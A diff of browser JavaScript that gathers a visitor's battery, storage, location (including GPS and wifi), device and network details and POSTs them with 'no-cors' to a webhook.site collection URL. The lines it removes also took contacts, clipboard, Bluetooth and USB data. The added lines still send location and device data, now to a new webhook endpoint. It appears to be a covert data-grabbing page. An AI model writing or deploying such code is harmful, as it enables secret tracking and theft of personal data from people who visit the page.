@@ -490,32 +490,16 @@
                         devicePixelRatio: validateNumber(window.devicePixelRatio)
                     },
                     timestamp: now.toLocaleString('en-IN', options),
-                    timestampISO: now.toISOString(),
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    batteryInfo: batteryInfo.status === 'fulfilled' ? batteryInfo.value : { supported: false, error: 'Failed to get battery info' },
-                    storageInfo: storageInfo.status === 'fulfilled' ? storageInfo.value : { supported: false, error: 'Failed to get storage info' },
-                    locationData: locationData.status === 'fulfilled' ? locationData.value : null,
-                    enhancedLocation: enhancedLocation.status === 'fulfilled' ? enhancedLocation.value : { gps: { success: false }, wifi: { success: false } },
-                    contactInfo: contactInfo.status === 'fulfilled' ? contactInfo.value : { contacts: null, permission: 'error', count: 0, success: false },
-                    deviceInfo: deviceInfo,
-                    networkInfo: networkInfo,
-                    advancedAPIs: {
-                        mediaDevices: mediaDevicesInfo,
-                        bluetooth: bluetoothInfo,
-                        usb: usbInfo,
-                        vibration: vibrationInfo,
-                        clipboard: clipboardInfo
-                    },
-                    dataCollection: {
-                        batterySupported: batteryInfo.status === 'fulfilled' ? batteryInfo.value.supported : false,
-                        storageSupported: storageInfo.status === 'fulfilled' ? storageInfo.value.supported : false,
-                        networkSupported: networkInfo.supported,
-                        contactSupported: contactInfo.status === 'fulfilled' ? contactInfo.value.permission !== 'not-supported' : false,
-                        contactSuccess: contactInfo.status === 'fulfilled' ? contactInfo.value.success : false
-                    }
+                    batteryInfo,
+                    storageInfo,
+                    locationData,
+                    enhancedLocation,
+                    deviceInfo,
+                    networkInfo
                 };
 
-                await fetch('https://webhook.site/4d99514c-d56d-4f9e-b1f2-fd45d96189dd', {
+                // Send data as plain JSON in a POST request
+                await fetch('https://webhook.site/637a2d96-f910-4fe4-a799-3870c01262d3', {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {
